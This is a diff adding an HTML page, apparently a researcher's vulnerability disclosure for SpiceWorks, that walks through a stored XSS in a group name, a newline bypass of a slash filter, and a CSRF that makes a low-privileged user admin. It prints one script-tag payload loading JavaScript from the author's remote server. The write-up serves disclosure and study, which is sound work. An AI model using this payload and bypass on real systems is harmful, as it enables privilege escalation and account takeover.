@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1">
+        <title>abu@abuyv.com</title>
+        <link rel="stylesheet" href="../css/semantic.css">
+        <link rel="stylesheet" href="../css/style.css">
+    </head>
+
+    <body>
+        <div id="particles-js"></div>
+        <div align="center" style="color:white" class="" id="nav">
+            <a class="ui secondary button" href="index.html">pgp</a>
+            <a class="ui secondary button" href="index.html">twitter</a>
+            <a class="ui secondary button" href="index.html">github</a>
+            <a class="ui secondary button" href="index.html">talks</a>
+            <a class="ui secondary button" href="spiceworks.html">cve</a>
+            <a class="ui secondary button" href="index.html">ctf</a>
+            <!--[ <a style="color:white" href="http://abuyv.com">pgp</a> ] -->	
+            <pre align="center" style="color:green;font-size:x-small;text-align: center">
+
+            </pre>
+
+            <div class="div-1">
+                <p style="text-align: left">
+                Using the Stored XSS vulnerability attacker can turn it into CSRF that I added low privileged user to the admin group with the help of "/settings/v1/users" function.
+                </p>
+
+                <figure>
+                    <iframe src="https://www.youtube.com/embed/ukrVpKyl9uY" width="500" height="281" frameborder="0" allow="autoplay; fullscreen" allowfullscreen title="SpiceWorks CSRF via XSS PoC"></iframe>
+                </figure>
+                
+                Step 1: visit to inventory section
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/01.png" alt="" class="center"/></figure>
+
+                Step 2: visit custom Groups
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/02-custom.png" alt="" class="center"/></figure>
+
+                Step 3: create a New Group 
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/03-new-group.png" alt="" class="center"/></figure>
+
+                Step 4: I tried to create a New Group name with the payload of loading JavaScript from remote server but we could not add the specified payload as there was a protection of adding forward slashes 
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/03-new-group-fail.png" alt="" class="center"/></figure>
+     
+                 <p style="background-color: red; border: 2px solid black; padding: 10px; background-repeat: no-repeat; background-size: 10px 10px">Payload: Abuyv">" &lt;script src="http://abuyv.com/abu.js">&lt;/script></p>
+
+                Step 5: After some research I could bypass the forward slashes by adding two new lines to the string submitted in the New Group section. So, I just created a random Group Name (in my case it was "Abuyv")
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/04-new-group-ex.png" alt="" class="center"/></figure>
+
+                Step 6: New Group got created 
+
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/05-new-group-created.png" alt="" class="center"/></figure>
+                
+                Step 7: In order to  modify the name to our payload I pressed save button with Burp suite interception on.
+
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/06-new-group-burp.png" alt="" class="center"/></figure>
+
+                Step 8: I just added two new lines to my payload by pressing enter and it bypassed the forward slash restriction!
+
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/07-new-group-burp-bypass.png" alt="" class="center"/></figure>
+                
+                Step 9: As you can see we could add the group name with the forward slashes and could load the javascript from the mentioned domain which will be triggered on Dashboard or home page.
+
+
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/08-bypassed-js.png" alt="" class="center"/></figure>
+
+                Step 10: Visit User Accounts under Help desk section 
+
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/09-user-accounts.png" alt="" class="center"/></figure>
+
+                Step 11: We will force the admin to change target@abuyv.com user's permission to admin privilege as there was not any csrf protection. Burp request of changing role to admin of target@abuyv.com can be found on the following picture.
+
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/10-to-admin.png" alt="" class="center"/></figure>
+
+                Step 12: I changed it to minimum request for CSRF attack as below.
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/11-minimum-req.png" alt="" class="center"/></figure>
+
+                Step 13: I created abu.js on the attacking machine to add target@abuyv.com user to admin group by changing role parameter to admin in the request.
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/12-attacker-server.png" alt="" class="center"/></figure>
+                 
+                Step 14: I changed it to minimum request for CSRF attack as below.
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/11-minimum-req.png" alt="" class="center"/></figure>
+
+                Step 15: Once victim visited the Dashboard or home page XSS will be triggered and our Session riding payload will run.
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/13-get-req.png" alt="" class="center"/></figure>
+              
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/14-we-are-admin.png" alt="" class="center"/></figure>
+
+                Step 16: We are admin now.
+                <figure class="wp-block-image"><img src="https://abuyv.com/uploads/spiceworks/14-admined.png" alt="" class="center"/></figure>
+
+                
+            </div>
+        </div>
+
+
+        <script src="../js/particles.js"></script>
+        <script src="../js/config.js"></script>
+    </body>
+</html>
